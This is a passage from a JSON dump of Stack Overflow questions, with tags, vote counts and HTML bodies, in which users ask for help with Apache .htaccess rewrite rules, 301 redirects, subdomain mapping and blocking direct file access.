%{HTTP_HOST} ^www\\.domain-alias2\\.com$ [NC]\nRewriteCond %{REQUEST_URI} !^/domain-alias2\nRewriteRule ^(.*)$ domain-alias2/$1 [L]\n</code></pre>\n\n<p>domain-alias1.com (yields) -> Forbidden. You don't have permission to access /domain-alias1/ on this server.\n(Which is what I want since .htaccess in domain.com/domain-alias1 contains Options -Indexes)</p>\n\n<p>domain-alias1.com/test (yields) -> Not Found. The requested URL /domain-alias1/test was not found on this server.\n(Which is what I expect since test does not exist)</p>\n\n<p>domain-alias1.com/main (yields) -> domain-alias1.com/domain-alias1/main/login_page.php</p>\n\n<p><strong>I am expecting rewrite to yield : domain-alias1.com/main/login_page.php</strong>\nwhere subfolder domain-alias1 is hidden from resulting url)</p>\n\n<p>Any help on how to get expected results?</p>\n"},{"tags":[".htaccess","mod-rewrite","rewrite","mediatemple"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12576194,"title":".htaccess rewrite on mediatemple","body":"<p>I'm hosted on mediatemple DV 4.0 server and use the following lines in my htaccess file (rewrite rules for the CMS)</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule /?([A-Za-z0-9_-]+)/?$ index.php?id=$1 [QSA,L]\n</code></pre>\n\n<p>it works well but when I'm trying to do a 301 redirect to point the old page to a new address it adds some unnecessary stuff into the url, for instance:</p>\n\n<pre><code>?id=locations-maryland\n</code></pre>\n\n<p>How do I modify the rewrite rule to keep the same functionality but remove the last part which basically makes the 301 redirect pointless as the CMS couldn't not find any page with this spammy url.</p>\n\n<p>It happens only on mediatemple I heard something about adding/removing an additional question mark somewhere but have not enough knowledge to resolve it by myself.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12574169,"title":"htaccess redirect with parameters","body":"<p>Looking to redirect a page with 2 parameters what i have is</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{QUERY_STRING} ^([^&amp;]&amp;)*id=8(&amp;|$)\n\nRewriteCond %{QUERY_STRING} ^([^&amp;]&amp;)*date=1349996400(&amp;|$)\n\nRewriteRule ^/calendar/event\\.php$ /news/nrsc-chloramines-open-house/ [R=301,L]\n</code></pre>\n"},{"tags":["php","javascript",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":29,"score":0,"question_id":12228886,"title":"Denying main links with .htaccess or anything else","body":"<p>I'm using an encrypted php program with smarty template.</p>\n\n<p>I wanted to open links such as <code>index.php?page=login</code> to open with login.php, so I used Rewrite mode in <code>.htaccesss</code>, for example</p>\n\n<pre><code>RewriteRule ^/*login.php$ /index.php?page=login [L]\n</code></pre>\n\n<p>in a few pages there should be a query for errors such as</p>\n\n<pre><code>RewriteRule ^/*support.php?(.+)$ /index.php?page=support&amp;%{QUERY_STRING} [L]\n</code></pre>\n\n<p>It works but I need to deny the main URLs so when users enters index.php?a=login manually nothing (or the main page) would show up and he should open the link only with /login.php.\nIs there a way to do this?</p>\n\n<p>A little help please...</p>\n"},{"tags":["php",".htaccess","wampserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":67,"score":-3,"question_id":12576220,"title":"Not found: the requested URL /viewprofile.php was not found on this server","body":"<p>I have a problem in my site, I cannot view the <code>viewprofile.php</code>.</p>\n\n<p>Here is my <code>.htaccess</code> file.</p>\n\n<pre><code>RewriteEngine on\nRewriteRule (.*)-(.*).htm$ viewprofile.php?id=$1\nRewriteRule (.*).htm$ viewprofile.php?id=$2\nRewriteRule viewads(.*)\\.htm$ viewads.php?id=$1\nRewriteRule (.*)&amp;(.*)\\.htm$ homeads.php?id=$2\nRewriteRule (.*).htm$ profile_city.php?id=$1\nRewriteRule (.*).htm$ profile_cast.php?id=$1\n\n\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ $1.php\nErrorDocument 404 /viewprofile.php\n\nRewriteEngine on\nRewriteCond %{HTTP_HOST} ^waytonikah.com [NC]\nRewriteRule ^(.*)$ http://waytonikah.com/$1 [L,R=301]\n</code></pre>\n"},{"tags":["php","html","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12575103,"title":".htaccess - Redirecting in a real directory 500 error","body":"<p><em>mydomain.com/forum/ is a real directory.</em></p>\n\n<p>When I do add these 2 lines to my .htaccess:</p>\n\n<pre><code>RewriteRule ^forum/([a-zA-Z0-9_-]+)/new-thread /forum/new-thread.php?comm=$1 [L]\nRewriteRule ^forum/([a-zA-Z0-9_-]+) /forum/community.php?comm=$1 [L]\n</code></pre>\n\n<p><code>mydomain.com/forum/</code> AKA <code>mydomain.com/forum/index.php</code> throws a 500 error, as well as all rules that are supposed to be changed by these lines. What am I doing wrong?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12561017,"title":"URL rewrite without redirect","body":"<p>I have two urls </p>\n\n<blockquote>\n  <p>domain.com / domain.de</p>\n</blockquote>\n\n<p>that redirect to </p>\n\n<blockquote>\n  <p>domain.other-host.de</p>\n</blockquote>\n\n<p>Is it possible via url-rewriting that the user won't see </p>\n\n<blockquote>\n  <p>domain.other-host.de</p>\n</blockquote>\n\n<p>in his browser but </p>\n\n<blockquote>\n  <p>domain.com</p>\n</blockquote>\n\n<p>Thanks in advance,</p>\n\n<p>Tobi</p>\n"},{"tags":["apache",".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12572529,"title":"Using rewrite to force browser refresh without further changing URL?","body":"<p>I've just redone my site and am trying to institute some rewrites to change URLs to a new structure. I'm most of the way there, thanks to some kind support people at pair, but I know they aren't supposed to deal with such issues so I'm hoping I can get the final piece of the puzzle here.</p>\n\n<p>There are four things I want to do.</p>\n\n<ol>\n<li>Convert spaces to underscores.</li>\n<li>Get rid of parentheses by changing things like \"(2003)\" to \"- 2003\".</li>\n<li>Change the structure of html calls.</li>\n<li>Force redirects so search engines get the new addresses.</li>\n</ol>\n\n<p>Right now, this is what I have:</p>\n\n<pre><code>RewriteEngine On\nRewritecond %{HTTP_HOST} ^(desktopscenes.com|www.desktopscenes.com)$ [nc]\nRewriteRule ^(.*)\\s(.*)$ $1_$2 [N]\nRewriteRule ^(.*)\\((.*)$ $1-_$2\nRewriteRule ^(.*)\\)(.*)$ $1$2\nRewriteRule ^(.*)slides/(.*)\\.html$ /$1index.htm#$2.jpg [NE,R=301]\n</code></pre>\n\n<p>Everything works, except for links to jpg files, which redirect properly internally, but I can't find a way to make show the proper new address on the address bar.</p>\n\n<p>For example, this old URL:</p>\n\n<pre><code>http://www.desktopscenes.com/Scenes from Big Sky Country (2003)/slides/First Montana Sunset.jpg\n</code></pre>\n\n<p>Properly shows the image at:</p>\n\n<pre><code>http://www.desktopscenes.com/Scenes_from_Big_Sky_Country_-_2003/slides/First_Montana_Sunset.jpg\n</code></pre>\n\n<p>But the browser bar doesn't show the new address, which I believe also means search engines aren't being notified of the new address.</p>\n\n<p>I tried a \"redirect to the same address\" with \"R=301\" but that fails, probably because of looping. I'm not sure what else to try, any ideas?</p>\n"},{"tags":["apache",".htaccess","redirect","vhosts","apache-config"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12565894,"title":"Apache vhosts config RewriteCond to ignore part of URL","body":"<p>I am attempting to control redirections on my site using the Apache vhosts config.</p>\n\n<p>I have two-letter regions setup, such as <code>/fr</code>, <code>/de</code>, <code>/es</code>, which I am currently ignoring as you will see from my vhosts file below. However I also have a 301 permanent redirect setup to redirect /cm (and <code>/fr/cm</code>, <code>/es/cm</code> etc) to another page - this is controlled in my back-end system.</p>\n\n<p>The complication is when I add the line <code>RewriteCond             %{REQUEST_URI}                  !^/cm</code> this is caught by the RewriteCond, however I then cannot access <code>/fr</code>, <code>/de</code>, <code>/es</code> etc <em>at all</em> as they seem to get stuck in a loop and go to: <code>www.ayrshireminis.com/fr/fr/fr/fr/fr/fr/fr/fr</code> and then it HTTP 500 Internal Server Errors.</p>\n\n<p>How could I change the RewriteCond to allow for:</p>\n\n<ul>\n<li>/pa (this will be redirected to /minis, but it is controlled in the database and needs to stay as a valid URL)</li>\n<li>/fr (the region)</li>\n<li>/fr/pa</li>\n<li>/es/pa</li>\n</ul>\n\n<p>etc.</p>\n\n<pre><code>    # ----------------------------------------------------------------------\n    # REGION SPECIFIC REDIRECTIONS\n    # Below will remove region specific part of URL and load content from main UK site\n    # ----------------------------------------------------------------------\n    RewriteCond             %{REQUEST_URI}                  ^/([a-z]{2})$                   [OR]\n    RewriteCond             %{REQUEST_URI}                  ^/([a-z]{2}/)(.*)$\n    RewriteCond             %{REQUEST_URI}                  !^/cm\n    RewriteRule             ^([a-z]{2}/|[a-z]{2})(.*)$      /$2                                             [L,QSA]\n\n    # For VirtualDocumentRoot development instance configurations\n    RewriteRule ^([^.]+)$ /index.php?url=$1 [L,QSA]\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":5898,"score":2,"question_id":697909,"title":".htaccess !-f rule not working","body":"<p>I have been using simple mod_rewrite rules for my CMS for years and am now making a new version, I am seeing the rewriteCond not making sense- I have the standard \"if is not a file\" but I still see the rewriterules being evaluated even though they're not supposed to. My rewrite code:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^/]+)$ index.php?page=$1\nRewriteRule ^([^/]+)/([^/]+)$ index.php?page=$1&amp;var=$2\n</code></pre>\n\n<p>I load /page/var and it works fine as index.php?page=page&amp;var=var, but I try to load /css/file.css and it loads index.php?page=css&amp;var=file.css even though /css/file.css <strong><em>is</em></strong> a file, so the whole rewrite section shouldn't even be evaluated.</p>\n\n<p>I've never seen htaccess apparently defy its own logic, can someone help me figure this out? Has anyone ever run across anything like this?</p>\n"},{"tags":[".htaccess","google","url-rewriting","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12572238,"title":"URL rewritten but indexed as Query String","body":"<p>I tried googling this but all it gave me was tutorials on how to rewrite so I thought I'd give it a shot asking it here. </p>\n\n<p>The problem is that we have a htaccess file that rewrites the urls to a query string:</p>\n\n<pre><code>RewriteEngine On\n\nRewriteBase /\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^\\/]+\\/*[^\\/]*\\/*.*)$ index.php?app_route=$1 [QSA,L]\n</code></pre>\n\n<p>This works and it seems google is picking it up, however when you click on the link in google it shows the query string that it's rewritten to. We only link to the 'nice' urls so we don't know where google picked this up. Google for <code>site:sorellehaarmode.nl</code> to see for yourself.</p>\n\n<p>Does anyone have experience with, or a solution to this problem?</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12522117,"title":"Why does this RewriteRule work for 301 redirect but nothing else?","body":"<p>I have the following rewrite rule:</p>\n\n<pre><code>RewriteRule ^(.*)/white/(.*)/$ /$1/$2/?tags=white [R=301,L]\n</code></pre>\n\n<p>It works and changes the following:</p>\n\n<pre><code>http://bag-saver.com/uk/shop/white/clutch-bags/\n</code></pre>\n\n<p>into:</p>\n\n<pre><code>http://bag-saver.com/uk/shop/clutch-bags/?tags=white\n</code></pre>\n\n<p>But, I don't want the 301. I want to simply rewrite the URL. I've tried the following:</p>\n\n<pre><code>RewriteRule ^(.*)/white/(.*)/$ /$1/$2/?tags=white [QSA,L]\n</code></pre>\n\n<p>But as soon as I remove the R=301, I get page not found errors.</p>\n\n<p>Why is this?</p>\n\n<p>Edit - here are the rest of the rules in place:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteRule ^(.*)-[0-9]{9}[0-9]+/$ /$1/ [R=301,L]\nRewriteRule ^(.*)/white/(.*)/$ /$1/$2/?tags=white [R=301,L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite","rewrite","rename"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12573774,"title":"Htaccess Rename php file into friendly url","body":"<p>my problem is i want to rename this 2 urls with htaccess and i have no idea</p>\n\n<p>want to convert</p>\n\n<pre><code>mydomain.com/info.php?act=statistics\nmydomain.com/info.php?act=about_us\n</code></pre>\n\n<p>into</p>\n\n<pre><code>mydomain.com/statistics\nmydomain.com/about_us\n</code></pre>\n\n<p>I will be very grateful since i dont know anything about htaccess.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":68,"score":-2,"question_id":12551382,"title":"What does $1 [QSA,L] mean in my .htaccess file?","body":"<p>I need to change my <code>.htaccess</code> and there are two lines which I don't understand.</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-l\n\nRewriteRule ^(.+)$ index.php?url=$1 [QSA,L]\n</code></pre>\n\n<p>When I should use these lines ?</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":8,"favorite_count":1,"up_vote_count":10,"down_vote_count":1,"view_count":1250,"score":9,"question_id":158384,"title":"What happens first? .htaccess or php code?","body":"<p>If I use mod_rewrite to control all my 301 redirects, does this happen before my page is served? so if I also have a bunch of redirect rules in a php script that runs on my page, will the .htaccess kick in first?</p>\n"},{"tags":["php",".htaccess","blocking","http-referer"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":12573079,"title":"Block direct access to files into subfolder, but allow to index page with htacess","body":"<p>I have a lot of folders and subfolder in my domain. I want to avoid direct access to files types html/ jpg/ gif/ etc in a specific subfolders, but I want it to be accessible by a index.php page.</p>\n\n<p>Structure is something like:</p>\n\n<ul>\n<li>www.domain.com/folder1</li>\n<li>www.domain.com/folder2</li>\n<li>www.domain.com/folder2/subfolder1</li>\n<li><strong>www.domain.com/folder2/subfolder2</strong></li>\n<li><strong>www.domain.com/folder2/subfolder2/index.php</strong></li>\n<li><strong>www.domain.com/folder2/subfolder2/page1.html</strong></li>\n<li><strong>www.domain.com/folder2/subfolder2/page2.html</strong></li>\n<li><strong>www.domain.com/folder2/subfolder2/images/1.jpg</strong></li>\n<li><strong>www.domain.com/folder2/subfolder2/images/2.jpg</strong></li>\n</ul>\n\n<p>I tryed to put page1.html, page2.html and images folder inside a new folder called <strong>blocked_content</strong>:</p>\n\n<ul>\n<li>www.domain.com/folder2/subfolder2/index.php</li>\n<li>www.domain.com/folder2/subfolder2/<strong>blocked_content</strong>/page1.html</li>\n</ul>\n\n<p>and added a .htaccess with <code>deny from all</code> and <code>Order Deny,Allow\nDeny from all</code> inside <strong>blocked_content</strong> folder. It blocked all, even index.php can't access the files inside this. Index.php only has simple links as <code>&lt;a href=\"blocked_content/page1.html\"&gt;</code></p>\n\n<p>Tryed this config on .htaccess:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_REFERER} !^$\nRewriteCond %{HTTP_REFERER} !^http://(www\\.)?domain\\.com [NC] \nRewriteRule \\.(swf|pdf|css|gif|png|jpg|html|htm)$ - [F]\n</code></pre>\n\n<p>And put it inside subfolder2 and got no effect.</p>\n\n<p>Tryed this config on .htaccess:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_REFERER} !^$\nRewriteCond %{HTTP_REFERER} !^http://(www\\.)?domain\\.com/folder2/subfolder2 [NC] \nRewriteRule \\.(swf|pdf|css|gif|png|jpg|html|htm)$ - [F]\n</code></pre>\n\n<p>I put it inside subfolder2: No effect. I put it in root directory it blocks all other folders.</p>\n\n<p>I searched a lot. I'm stucked. What am I doing wrong? Putting htacess in wrong places or forgeting to add something? I want to do this by .htacess if it is possible. Include php sessions to all html files will not work because I can't change the file names.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":12137746,"title":"htaccess redirect specific URL to different domain","body":"<p>I have 2 domain pointing to same directory, Now I want to redirect some URLs to one specific domain and rest should be on main domain.</p>\n\n<p>I have one domain www.xyz.com this is main domain site will be open with this domain, from this domain I want to redirect specific URLs to different domain so if someone open www.xyz.com/a/theatre then it should redirect to www.abc.com/a/theatre. And now from same this new domain if someone click on URL which don't have \"/a/theatre\" in URL then it should redirect back to main domain. So if someone open <strong>www.abc.com/a/classes</strong> then it should redirect to <strong>www.xyz.com/a/classes</strong></p>\n\n<p>I have used bellow rules but not working,</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^www.xyz.com$ [NC]    \nRewriteCond %{REQUEST_URI} ^/a/theatre$    \nRewriteRule (.*)$ http://www.abc.com/a/$1 [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^www.abc.com$ [NC]    \nRewriteCond %{REQUEST_URI} !^/a/theatre    \nRewriteRule (.*)$ http://www.xyz.com/a/$1 [NC,L,R=301]\n</code></pre>\n\n<p>Any help is appreciated.\nThanks!</p>\n\n<p>Here is all code from my htaccess, I have installed Joomla on this domain.</p>\n\n<pre><code>Options -Indexes\n\nRewriteEngine on\nRewriteBase /seo\nRewriteCond %{HTTP_HOST} ^www.mcleancenter.org$ [NC]\nRewriteCond %{REQUEST_URI} ^/seo/alden-theatre$\nRewriteRule ^/?seo/(.*)$ http://www.aldentheatre.org/seo/$1 [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^www.aldentheatre.org$ [NC]\nRewriteCond %{REQUEST_URI} !^/seo/alden-theatre\nRewriteRule ^/?seo/(.*)$ http://www.mcleancenter.org/seo/$1 [NC,L,R=301]\n\n########## Begin - Joomla! core SEF Section\n#\n#RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !^/index.php\nRewriteCond %{REQUEST_URI} (/|\\.php|\\.html|\\.htm|\\.feed|\\.pdf|\\.raw|/[^.]*)$  [NC]\nRewriteRule (.*) index.php\nRewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization},L]\n#\n########## End - Joomla! core SEF Section\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","map","switch-statement"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":100,"score":1,"question_id":12572613,"title":"Htaccess RewriteRule","body":"<p>After asking this question <a href=\"http://stackoverflow.com/questions/12442962/htaccess-urlrewrite-to-another-map/12443000#12443000\">Htaccess URLRewrite to another map</a>\nThat works great, but now i want to add an extra 'map', but that don't work. </p>\n\n<p>My .htaccess file now:</p>\n\n<pre><code>ErrorDocument 404 /v2/404.php\nErrorDocument 404 /v2/505.php\n\nRewriteEngine on\n\nRewriteRule ^error/([^/]+)/?$ error.php?id=$1 [L,QSA,NC]\n\nRewriteRule ^email/([^/]+)/?$ email.php?id=$1 [L,QSA,NC]\n\nRewriteRule ^activate/([^/]+)/?$ activate.php?code=$1 [L,QSA,NC]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^werknemer/([^/]+)/?$ werknemer/$1.php [L,QSA,NC]\n\nRewriteRule ^klanten/([^/]+)/?$ klanten/$1.php [L,QSA,NC]\n\nRewriteCond %{REQUEST_FILENAME}.php -f\n\nRewriteRule ^(.*)$ $1.php [L]\n</code></pre>\n\n<p>Always the last wont work, now RewriteRule ^klanten/ don't work, and when i do RewriteRule ^werknemer/ after RewriteRule ^klanten/, RewriteRule ^klanten/ works but RewriteRule ^werknemer/ not.</p>\n\n<p>How to fix this?</p>\n\n<p>Thanks!\nWouter0100</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12569007,"title":"How do I do a htaccess rewrite to another folder for a single file?","body":"<p>We moved a part of our site from one sub folder to another. I want to put permanent redirects (301) into htaccess for the files in this folder (some have changed their filename as well, so I can't just setup one rule for the whole folder). Here's what I'm trying</p>\n\n<pre><code>RewriteRule ^search/tutorial-search.html$ db/tutorial.php [R=301]\n</code></pre>\n\n<p>This doesn't work though, I get a 404 response when now entering the old URL. I find this curious as I had a rule in place for ages that does work, which looks like this:</p>\n\n<pre><code>RewriteRule ^search/tutorial-search.html$ search/tutorial-search.php\n</code></pre>\n\n<p>I really don't see the big difference. I also tried the following (among others) but it doesn't work either</p>\n\n<pre><code>RewriteRule ^search/tutorial-search.html$ db/tutorial.php\n</code></pre>\n\n<p>What exactly is causing this to fail? Just to make sure I put all of these at the exact same line of the htaccess file. Is it because I'm rewriting to another folder? Thanks :)</p>\n"},{"tags":["php",".htaccess","seo","http-redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12470900,"title":"best practise to set 2000 Http redirects","body":"<p>I have an old site (<code>www.example.com</code>) with approximately 2000 documents (PDF, Word doc, Excel). All the 2000 documents (PDF &amp; Word doc) use these existing links to refer each other.</p>\n\n<p>I have created another site (<code>www.example.net</code>), with a different document path. I want to map the old URLs to the new, so that I don't lose the visits, and so that a user who has an old file with the old link will still get the documents from the new site.</p>\n\n<p>Old document path: <code>http://www.example.com/sites/docs/abc.pdf</code></p>\n\n<p>New document path: <code>http://www.example.net/files/resources/def.pdf</code></p>\n\n<p>(Note that the domain name has changed, the path to the document has changed, and the document name itself has changed. There is no pattern to the change in document names.)</p>\n\n<p>Common Solutions: </p>\n\n<ol>\n<li><p><code>.htaccess</code> redirects, but there are 2000 docs, so it's a lot of work</p></li>\n<li><p>normal redirects with hard coded URLs in a <code>.php</code> file, which will work the same as the <code>.htaccess</code></p></li>\n</ol>\n\n<p>Is there any better solution than these?</p>\n"},{"tags":["linux",".htaccess","http-redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12521844,"title":".htaccess 301 redirect page with no extension to a PHP page","body":"<p>I'm having a problem getting an old WordPress site page to redirect to the new basic PHP site page.</p>\n\n<p>Example: The old WordPress page with no extension is at <code>http://example.com/levelone/leveltwo/pagename</code></p>\n\n<p>The new page is at <code>http://example.com/directory/pagename.php</code>.</p>\n\n<p>Here are several things I've tried:</p>\n\n<pre><code>redirect 301  /levelone/leveltwo/pagename http://example.com/directory/pagename.php\n</code></pre>\n\n<p>This did not work at all</p>\n\n<p>Then I tried redirecting the directories first, then the page, like so:</p>\n\n<pre><code>RedirectMatch 301 ^/levelone/leveltwo/ http://example.com/directory/\nredirect 301  /pagename http://example.com/pagename.php\n</code></pre>\n\n<p>This almost worked, but gave me the right URL but without the PHP extension.</p>\n\n<p>I can't just redirect an old directory to a new one because there are actually many. The example is just one. The trouble seems to be going from a non-extension page to a page with the <code>.php</code> extension.</p>\n\n<p>Here's another thing I tried:</p>\n\n<pre><code>RedirectMatch 301 ^/levelone/leveltwo/(.*)$ /directory/$1.php\nredirect 301  /pagename http://example.com/pagename.php\n</code></pre>\n\n<p>This gave me <code>http://example.com/directory/pagename/.php</code>.</p>\n\n<p><em><strong>Solved: I got it to work with the following:</em></strong></p>\n\n<pre><code>Redirect 301 /levelone/leveltwo/pagename/ http://example.com/directory/pagename.php\n</code></pre>\n\n<p>The problem seemed to be with the missing forward-slash after the old page name. </p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":11824536,"title":"Remove a subdirectory from .htaccess redirect","body":"<p>I have tried a lot of codes found here, but none of them worked for me.</p>\n\n<p>On my site everything is redirected from:</p>\n\n<pre><code>http://mysite.it/\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>http://mysite.it/folder1\n</code></pre>\n\n<p>And I have a folder named \"folder2\" and I want to exclude this from url redirection. Now, if I write mysite.it/folder2 in my browser, it goes to mysite.it/folder1/folder2</p>\n\n<p>I have many domains in my site. The .htaccess in my /public_html/mysite-it looks like:</p>\n\n<pre><code>RewriteEngine on\n\n#RewriteCond %{HTTP:Accept-Language} (es|fr) [NC]\n#RewriteRule .* http://www.mysite.eu [R=301,L]\n\n#RewriteCond %{HTTP:Accept-Language} (de) [NC]\n#RewriteCond %{HTTP:Accept-Language} !(en) [NC]\n#RewriteRule .* http://www.mysite.de [R=301,L]\n\n#RewriteCond %{REQUEST_URI} !^/directory1 [NC]\nRewriteCond %{REQUEST_URI} !^/directory2 [NC]\nRewriteCond %{REQUEST_URI} !^/directory3 [NC]\nRewriteCond %{REQUEST_URI} !^/directory4 [NC]\nRewriteCond %{HTTP_HOST} ^(www.)?mysite.it$\nRewriteRule ^(.*)$ \"http\\:\\/\\/www\\.mysite\\.it\\/folder1\\/$1\" [R=301,L]\n</code></pre>\n\n<p>I have written a .htaccess in /folder2 with the following content:</p>\n\n<pre><code>RewriteEngine off\n</code></pre>\n\n<p>This isn't worked too. Have you got any idea how to fix it?\nThanks!</p>\n"},{"tags":["html",".htaccess","google-chrome"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12565047,"title":"PDF not downloading in Chrome","body":"<p>I have integrated the following page <a href=\"http://www.fluotics.com/new/index.php/support-page\" rel=\"nofollow\">click here</a> into expression engine. Only certain PDFs will download in chrome, as demonstrated in the link above, whereas with Firefox users are able to download all PDFs on the page. I've been searching through various expression engine forums and followed instruction such as disabling my XSS Filter and re uploading all my PDFs. I'm also running this latest version of EE and i've tried downloading PDFs logged out of the super-admin account. </p>\n\n<p>I'm not sure whether this is a browser issue or an issue with expression engine, has anyone come across this problem before?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12568165,"title":"How can I use an .htaccess redirect for a partial path?","body":"<p>I had to adjust some paths on my site and I need to use .htaccess to redirect the items on the chance a user accesses the old url.</p>\n\n<p>For example my old urls (relative) could be:</p>\n\n<pre><code>/old-path/page1.php\n/old-path/page2.php\n/old-path/page3.php\netc...\n</code></pre>\n\n<p>I had to change the path (for this example) to new-path and I need to adjust the .htaccess so anyone that comes to any page with .../old-path/... will be redirected to </p>\n\n<pre><code>.../new-path/...\n</code></pre>\n\n<p>Also, would this satisfy the 301 or would I need to list out each page?</p>\n"},{"tags":["php",".htaccess","mod-rewrite","redirect","url-rewriting"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":37,"score":0,"question_id":12568291,"title":"Use .htaccess to rewrite post.php?post_id=20 to /post/this-is-the-title/","body":"<p>I am new to .htacces and for ages I have been trying to get my domain from:</p>\n\n<pre><code>www.domain.com/post.php?post_id=20\n</code></pre>\n\n<p>to something such as this:</p>\n\n<pre><code>www.domain.com/post/this-is-the-title/\n</code></pre>\n\n<p>As I said I am new to .htaccess but anything would help please!\nNOTE: I would be getting the titles of my blog posts from an SQL database somehow</p>\n"},{"tags":["apache",".htaccess","subdomain","root"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12487574,"title":"Set root .htaccess to selectively ignore subdomains/folders","body":"<p>I have a few different softwares on my server, and multiple subdomains. I'm using the typical LAMP stack, CentOS, Apache, MySQL, PHP, etc.</p>\n\n<p>The problem is, a few particular folders could really do without having any .htaccess influence from the root, since it breaks some critical areas of the installations. Unfortunately, disabling <code>RewriteEngine</code> alone is not enough, as there is more to it that is affecting it.</p>\n\n<p>This is what I want to do.</p>\n\n<p><code>.htaccess</code> in the root (I want this to remain in effect as it distributes some common things I want across most areas of my domain, but I want to be able to selectively be able to completely disable <code>.htaccess</code> from reaching certain subdomains/folders)</p>\n\n<p>To be totally clear, I don't want to stop <code>.htaccess</code> from affecting other folders completely, I just want to be able to specify which ones it reaches, or the ones I don't want it to reach.</p>\n"},{"tags":[".htaccess","drupal"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":6,"score":0,"question_id":12567265,"title":"Setting postback/jobs to public in drupal.","body":"<p>What file do I modify to give postback/jobs public access in drupal? I created postback/jobs in order to give my transcoder access to my drupal site. My guess is that I should include some line in my htaccess file but I am reluctant to make any changes to it without knowing exactly what the outcome might be. Any help would be great. Thanks. </p>\n"},{"tags":["apache",".htaccess","mod-rewrite","rewrite","subdomain"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":129,"score":0,"question_id":11568569,"title":".htaccess rewrite wildcard subsubdomain and params","body":"<p>I'm trying to write a mod_rewrite to work like this</p>\n\n<ul>\n<li><code>wildcard.subdomain.domain.com</code> => <code>subdomain.domain.com/data.php?q=wildcard</code></li>\n<li><code>wildcard.subdomain.domain.com/?repeat=1</code> => <code>subdomain.domain.com/data.php?q=wildcard&amp;repeat=1</code></li>\n<li><code>subdomain.domain.com</code> => <code>data.php</code></li>\n<li><code>www.subdomain.domain.com</code> => 